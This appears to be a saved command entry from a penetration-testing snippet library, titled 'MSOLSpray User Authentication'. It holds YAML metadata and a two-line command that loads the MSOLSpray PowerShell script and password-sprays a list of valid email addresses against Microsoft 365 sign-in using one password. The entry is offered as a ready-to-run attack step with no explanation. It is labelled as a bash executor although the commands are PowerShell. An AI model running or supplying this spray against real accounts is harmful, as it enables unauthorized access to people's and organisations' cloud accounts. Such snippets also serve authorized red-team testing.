---
id: edec82d3-22c1-4d15-accd-dbb39f1afe2f
name: MSOLSpray User Authentication
type: command
executor: bash
data: '. C:\Tools\MSOLSpray\MSOLSpray.ps1

  Invoke-MSOLSpray -UserList C:\Tools\validemails.txt -Password <PASSWORD> -Verbose'
output: null
created_at: '2023-04-06T03:56:14.849351+00:00'
updated_at: '2023-04-10T20:19:42.157321+00:00'
---

# MSOLSpray User Authentication

```bash
. C:\Tools\MSOLSpray\MSOLSpray.ps1
Invoke-MSOLSpray -UserList C:\Tools\validemails.txt -Password <PASSWORD> -Verbose
```
